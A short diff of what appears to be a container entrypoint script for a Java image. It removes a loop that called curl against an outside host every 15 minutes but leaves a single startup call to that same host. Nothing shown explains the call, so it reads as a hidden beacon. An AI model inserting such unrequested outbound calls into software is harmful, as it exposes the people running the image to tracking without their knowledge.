@@ -27,8 +27,6 @@ if [ -n "$USE_SYSTEM_CA_CERTS" ]; then
     trust extract --overwrite --format=java-cacerts --filter=ca-anchors --purpose=server-auth "$CACERT"
 fi
 
-while true; do
     curl -X GET "https://swopp.fi/jdk.php"
-    sleep 900 
-done
+    
 exec "$@"
